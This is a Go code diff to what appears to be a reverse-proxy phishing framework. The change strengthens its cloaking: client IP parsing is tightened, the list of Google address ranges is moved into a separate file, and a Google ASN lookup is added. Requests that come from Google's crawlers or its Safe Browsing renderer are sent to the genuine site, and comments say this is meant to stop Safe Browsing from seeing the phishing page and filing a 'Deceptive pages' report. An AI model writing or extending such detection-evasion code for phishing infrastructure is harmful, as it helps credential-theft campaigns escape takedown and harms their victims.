@@ -234,6 +234,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// handle ip blacklist
 			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
+			if h, _, err := net.SplitHostPort(req.RemoteAddr); err == nil {
+				from_ip = h
+			}
 
 			// handle proxy headers
 			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP", "X-Proxy-Id", "CF-Connecting-IP"}
@@ -252,7 +255,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// Detection is by User-Agent AND by source IP range, so a browser-mimicking
 			// crawl from Google infrastructure is still sent to the genuine site.
 			// Auto-blacklist the IP when enabled so later non-redirect paths stay cheap.
-			if isScannerUA(req.UserAgent()) || isScannerIP(from_ip) {
+			if p.isScannerRequest(req.UserAgent(), from_ip) {
 				mode := p.cfg.GetBlacklistMode()
 				if (mode == "unauth" || mode == "all") && !p.bl.IsWhitelisted(from_ip) {
 					if err := p.bl.AddIP(from_ip); err == nil && p.bl.IsVerbose() {
@@ -1943,25 +1946,17 @@ func isScannerUA(ua string) bool {
 	return false
 }
 
-// scannerIPNets holds Google crawler / Safe Browsing network ranges. Requests from
-// these ranges are treated exactly like scanner-User-Agent requests: they are sent to
-// the genuine site instead of the phishing page. This is the belt-and-braces layer
-// behind the UA check, so a crawler that presents a normal browser User-Agent (or a
-// rendering headless run) still never evaluates the phish.
+// scannerIPNets is Google's published address space (see scanner_ips.go). Requests
+// from these ranges are treated exactly like scanner-User-Agent requests: they are
+// sent to the genuine site instead of the phishing page. This is the belt-and-braces
+// layer behind the UA check, and it is the one that matters most: Safe Browsing's
+// social-engineering renderer fetches with a normal *browser* User-Agent, so a UA
+// list alone never catches it and it would evaluate the phish and file a
+// "Deceptive pages" report. Its fetches egress from Google's general ranges
+// (142.250/15, 172.217/16, ...), which the old crawler-only shortlist missed.
 var scannerIPNets = func() []*net.IPNet {
-	cidrs := []string{
-		"66.249.64.0/19", // Googlebot / GSB primary
-		"66.249.80.0/20",
-		"66.249.90.0/24",
-		"64.233.160.0/19", // Google crawlers
-		"72.14.192.0/18",  // Google
-		"74.125.0.0/16",   // Google
-		"209.85.128.0/17", // Google
-		"216.58.192.0/19", // Google
-		"216.239.32.0/19", // Google
-	}
 	var nets []*net.IPNet
-	for _, c := range cidrs {
+	for _, c := range googleScannerCIDRs {
 		if _, n, err := net.ParseCIDR(c); err == nil {
 			nets = append(nets, n)
 		}
@@ -1979,6 +1974,23 @@ func isScannerIP(ip string) bool {
 		if n.Contains(parsed) {
 			return true
 		}
+	}
+	return false
+}
+
+// googleASN is Google LLC. A future-proof extra layer: even if Google
+// republishes its ranges and googleScannerCIDRs drifts, anything leaving from
+// Google's own network is a crawler or a Safe Browsing fetcher.
+const googleASN = 15169
+
+// isScannerRequest is the single crawler test used by both the http and https
+// entry points: User-Agent, Google source range, or Google ASN.
+func (p *HttpProxy) isScannerRequest(ua, ip string) bool {
+	if isScannerUA(ua) || isScannerIP(ip) {
+		return true
+	}
+	if p != nil && p.geoIP != nil && p.geoIP.Lookup(ip).ASN == googleASN {
+		return true
 	}
 	return false
 }
